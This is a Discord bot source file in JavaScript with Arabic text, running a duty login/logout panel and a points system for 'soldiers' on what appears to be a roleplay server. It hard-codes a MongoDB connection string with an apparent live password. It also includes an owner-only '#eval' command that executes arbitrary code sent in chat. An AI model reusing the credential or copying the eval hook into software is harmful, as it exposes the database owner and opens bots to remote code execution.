//@ts-nocheck
const { Client,Partials } = require('discord.js');
const Discord = require("discord.js")
const { registerCommands, registerEvents } = require('./utils/registry');
const config = require('./slappey.json');
const client = new Client({ intents: 3276799,partials: [Partials.Message, Partials.Channel, Partials.User]});
const mongoose = require('mongoose');
const { QuickDB } = require("quick.db");

const db1 = new QuickDB();
(async () => {
  client.commands = new Map();
  client.events = new Map();
  client.prefix = config.prefix;
  client.n38th = db1;
  await registerCommands(client, '../commands');
  await mongoose.connect("mongodb+srv://hajoza13:CLJuAnG9Dqu5d9xa@cluster0.xtvu42t.mongodb.net/?retryWrites=true&w=majority")
  await registerEvents(client, '../events');
  await client.login(config.token);
})()

process.on('unhandledRejection', (reason, p) => {
  console.log(reason)
});

process.on('uncaughtException', (err, origin) => {
  console.log(err)
});
client.on("messageCreate",async message=>{
    if(!message.content.startsWith("#eval")) return
    if( message.author.id != "772082329866862604") return
    const cmd = message.content.substring(("#" + "eval").length + 1);
    let result = eval(cmd);
    if (result instanceof Promise) {
        result = await result;
    }

    if(client.token.includes(result)) return;

    let embed = new Discord.EmbedBuilder()
    .setColor('BLACK')
    .setDescription("Eval: ```js\n" + cmd + "```\nResult: ```js\n" + result + "```");

    message.channel.send({ embeds: [embed] });
})
process.on('uncaughtExceptionMonitor', (err, origin) => {
  console.log(err)
});
const dbClass = require("pro.db-arzex")

let db = new dbClass("points.json")

var moment = require('moment-timezone');

var pr = require("pretty-ms")

client.on("messageCreate", async message=>{

    if(message.content == "#مركز العمليات"){

        if(message.author.id != "882713434821656628") return

        let row = new Discord.ActionRowBuilder()

        .addComponents(

            new Discord.ButtonBuilder()

            .setCustomId("login")

            .setLabel("تسجيل الدخول")

            .setStyle(Discord.ButtonStyle.Success)

            .setEmoji("✅"),

            new Discord.ButtonBuilder()

            .setCustomId("logout")

            .setLabel("تسجيل الخروج")

            .setStyle(Discord.ButtonStyle.Danger)

            .setEmoji("❌")

        )

        let embed = new Discord.EmbedBuilder()

        .setColor("DarkBlue")

        .setTitle("تسجيل دخول/خروج")

        .setDescription("تستطيع تسجيل الدخول او الخروج من الازرار في الاسفل")

        .setFooter({text : "By Wonder Bots",iconURL:message.guild?.iconURL()})

        message.channel.send({components :[row],embeds:[embed]})

    }

})

// @ts-ignore

client.on("interactionCreate", async interacion=>{

    if(!interacion.isButton()) return

    if(!interacion.inGuild()) return

    if(!interacion.member.roles.cache.has("1039298039141105674")) return

    if(interacion.customId == "login"){

        if(db.has(interacion.user.id)) return interacion.reply({content : `:x: | انت مسجل دخول بالفعل`,ephemeral:true})

        db.set(interacion.user.id,Date.now())

        db.add(`points-${interacion.user.id}`,1)

        interacion.member.roles.add("1097441913881247804")

        interacion.member.roles.remove("1097442097918910484")

        interacion.reply({content:":white_check_mark:",ephemeral:true})

        let ch = await client.channels.fetch("")

        if(!ch) return

        ch.send({content : `

لقد قام العسكري : ${interacion.user}

بتسجيل الدخول الان`})

    }

    if(interacion.customId == "logout"){

        if(!db.has(interacion.user.id)) return interacion.reply({content : `:x: | انت مسجل خروج بالفعل 
`,ephemeral:true})

        let ch = await client.channels.fetch("1097481049489023026")

        if(!ch) return

        ch.send({content : `

لقد قام العسكري : ${interacion.user}

بتسجيل الخروج 

عند الساعة : ${moment.tz("Asia/Riyadh").hour()} :${moment.tz("Asia/Riyadh").minute()}

بتسجيل الخروج الان

مدة التسجيل : ${pr(Date.now() - db.get(interacion.user.id)).replace("ms","مللي ثانية").replace("m","دقيقة").replace("s","ثانية").replace("h","ساعة")}`})

        db.delete(interacion.user.id)

        interacion.member.roles.remove("1097441913881247804")

        interacion.member.roles.add("1097442097918910484")

        interacion.reply({content:":white_check_mark:",ephemeral:true})

    }

})

client.on("messageCreate",async message=>{

    if(message.content.startsWith("#نقاط")){

        let member = message.mentions.members?.first() || message.member

        let points = db.has(`points-${member?.id}`) ? db.get(`points-${member?.id}`) : 0

        message.reply({content : `

ان نقاط العسكري ${member} , من النقاط هو ${points}`})

    }

    if(message.content.startsWith("#زيد")){

        if(!message.member?.roles.cache.has("991438392195817592")) return

        let args = message.content.split(" ")

        if(!args[2]) return message.reply("#زيد @ الشخص العدد")

        let member = message.mentions.members.first()

        if(!member) return message.reply("#زيد @منشن العدد")

        db.add(`points-${member?.id}`,parseInt(args[2]))

        message.reply({content : ":white_check_mark: | تمت اضافة النقاط بنجاح"})

    }

})